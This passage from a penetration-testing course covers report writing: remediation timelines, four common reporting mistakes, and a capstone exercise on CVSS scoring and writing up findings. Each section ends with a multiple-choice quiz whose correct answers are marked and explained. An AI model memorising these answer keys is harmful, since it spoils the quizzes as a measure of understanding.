- Where a quick compensating control exists (e.g. a WAF rule) alongside a slower proper fix (e.g. a code change), report both and be explicit about which is temporary
- Group remediation recommendations by root cause where several findings share one — fixing one underlying issue may resolve multiple findings at once, and the report should say so

**Quick Quiz:**

1. Per this topic, what timeframe should be attached to a Critical-severity finding?
   - **An immediate or days-scale fix window** ✓
   - The next scheduled release or patch cycle
   - A multi-month window since Critical findings take longest to fix
   - No specific timeframe — severity alone communicates urgency
   > The topic ties Critical findings to an immediate or days-scale fix window, with High at weeks and Medium/Low at the next release cycle.
2. Why does a remediation recommendation with no deadline risk being ignored?
   - Because CVSS forbids scoring undated findings
   - Because undated findings are automatically marked false positive
   - Because clients are legally required to ignore them
   - **Because clients' engineering teams triage against other dated work, and an undated finding quietly loses that competition** ✓
   > The topic states a timeline with no deadline is a suggestion, not a requirement, since undated findings lose out against dated work.
3. If a WAF rule offers a quick compensating control while a code change is the proper long-term fix, what should the report do?
   - Only mention the WAF rule and omit the code fix
   - **Report both, and be explicit about which is temporary** ✓
   - Only mention the code fix since the WAF rule is irrelevant
   - Recommend disabling the WAF until the code fix ships
   > The topic states where both a quick compensating control and a slower proper fix exist, the report should include both and be explicit about which is temporary.

#### 305. Common Reporting Mistakes `[theory]` — Week 16

The same handful of mistakes recur across otherwise-solid reports, and each one costs the report credibility with a different audience. Over-technical language loses the business reader the executive summary was supposed to reach, turning a report that should drive a funding decision into one that gets forwarded straight to engineering unread. Missing reproduction steps make a finding functionally unverifiable — a client's team that can't reproduce a bug can't confirm it's fixed, and an unverifiable finding invites the assumption it was never real. Inflated severity ratings — scoring everything Critical or High to make the engagement look more valuable — erode trust fast, because the first time a client's own team disputes a score and wins, every other score in the report becomes suspect. And failing to flag false positives or already-mitigated findings signals the report wasn't actually reviewed by a human before delivery. You finish able to review a draft report and catch each of these four failure modes before a client does.

**Key Points:**

- Over-technical language in the executive summary defeats its purpose — a CISO who has to translate the summary before forwarding it will look for a different provider next time
- Missing or vague reproduction steps make a finding unverifiable, and an unverifiable finding is indistinguishable from an incorrect one to a skeptical reader
- Inflated severity (padding Critical/High counts) buys short-term credibility and loses long-term trust the first time a client successfully disputes a score
- Not noting false positives or already-remediated findings — anything the client's own team flags as wrong before you do damages the perceived rigor of the entire report
- A report riddled with typos or unproofread CVSS scores reads as unreviewed work, regardless of how solid the underlying testing was

**Quick Quiz:**

1. What happens the first time a client successfully disputes an inflated severity score, per this topic?
   - Nothing — the rest of the report remains fully trusted
   - The report is automatically discarded
   - **Every other score in the report becomes suspect, eroding trust** ✓
   - The CVSS calculator is blamed instead of the assessor
   > The topic states inflated severity erodes trust fast, because once a client disputes and wins on one score, every other score becomes suspect.
2. Why is a finding with missing or vague reproduction steps effectively as bad as an incorrect finding?
   - **Because it's unverifiable, and the client's team can't confirm it's fixed, so it's indistinguishable from a finding that was never real** ✓
   - Because CVSS requires repro steps for scoring
   - Because unverifiable findings are automatically rescored as Low
   - Because vague findings are always false positives by definition
   > The topic states missing reproduction steps make a finding unverifiable, and an unverifiable finding is indistinguishable from an incorrect one.
3. What does failing to flag false positives or already-mitigated findings signal to the client, per this topic?
   - That the engagement covered more scope than agreed
   - That the CVSS scores are inflated
   - That reproduction steps are missing
   - **That the report wasn't actually reviewed by a human before delivery** ✓
   > The topic states failing to flag false positives or already-mitigated findings signals the report wasn't actually reviewed by a human before delivery.

#### 306. Capstone Synthesis: From L38 Findings to a Client-Ready Report `[exercise]` — Week 16

This is where the module closes the loop: take the actual findings you produced in the Week 12 capstone (L38's 48-hour pentest simulation) and rebuild the last mile of that engagement — the part that decides whether the other 44 hours mattered. For at least three of your capstone findings, assign a full CVSS v3.1 base score using the metric groups from this module and record which severity band each lands in. Then write one executive-summary paragraph covering your capstone engagement as if the reader is a CISO who will never look past page one. Finally, take your single highest-severity capstone finding and write it out as a complete technical finding — title, CVSS score, affected asset, description, real evidence from your own engagement notes or screenshots, exact reproduction steps, and remediation guidance specific enough for a developer to act on without asking you anything further. You finish having produced, end to end, the exact deliverable a paying client receives at the close of a real engagement.

**Key Points:**

- Pull directly from your own L38 capstone notes and evidence — this is not a hypothetical exercise, score and write up findings you actually produced
- CVSS-score at least three capstone findings using the full base metric group walkthrough from this module, not a gut-feel severity label
- Write one executive-summary paragraph for the capstone engagement as a whole, aimed at a reader who will never read past it
- Build one complete technical finding for your highest-severity result: title, CVSS score, affected asset, description, evidence, reproduction steps, remediation
- Compare your finished write-up against the common-mistakes checklist from this module before considering it done

**Quick Quiz:**

1. How many capstone findings does this exercise require you to assign a full CVSS v3.1 base score to?
   - Exactly one
   - **At least three** ✓
   - All findings from the entire capstone
   - None — only the highest severity finding needs scoring
   > The exercise requires assigning a full CVSS v3.1 base score to at least three of your capstone findings.
2. For which finding does this exercise require a complete technical write-up (title, CVSS score, affected asset, description, evidence, reproduction steps, remediation)?
   - Every finding from the capstone
   - A finding chosen at random
   - **Your single highest-severity capstone finding** ✓
   - Only findings rated Medium or below
   > The exercise requires the complete technical finding write-up for your single highest-severity capstone finding.
3. What is the final step this exercise asks you to take before considering your write-up done?
   - **Compare it against the common-mistakes checklist from this module** ✓
   - Submit it directly to FIRST.org for review
   - Delete all evidence to protect client confidentiality
   - Rescore every finding as Critical for consistency
   > The exercise instructs comparing your finished write-up against the common-mistakes checklist from this module before considering it done.


---

